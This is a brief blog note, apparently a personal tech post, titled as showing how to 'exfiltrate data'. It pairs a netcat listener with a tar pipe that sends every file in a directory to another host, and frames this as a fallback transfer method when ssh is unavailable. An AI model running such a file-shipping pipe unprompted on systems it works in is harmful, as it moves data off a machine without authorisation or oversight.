---
title: "Using Netcat and Tar to Exfiltrate Data"
date: 2020-10-13T18:52:02+02:00
draft: false
---

Little note on how to use netcat in combination with tar to transmit data between servers when no other easier transfer protocol is available (for example no ssh client or connectivity).

On the "server/destination" side (in Linux) run:

#:> netcat -l -p 7000 | tar x

On the "client/origin" side (in Linux) run:

#:> tar cf - * | netcat otherhost 7000

 * can be a filename (for example an already prepared tar.gz file)

More examples/operating system specific details here:
http://toast.djw.org.uk/tarpipe.html
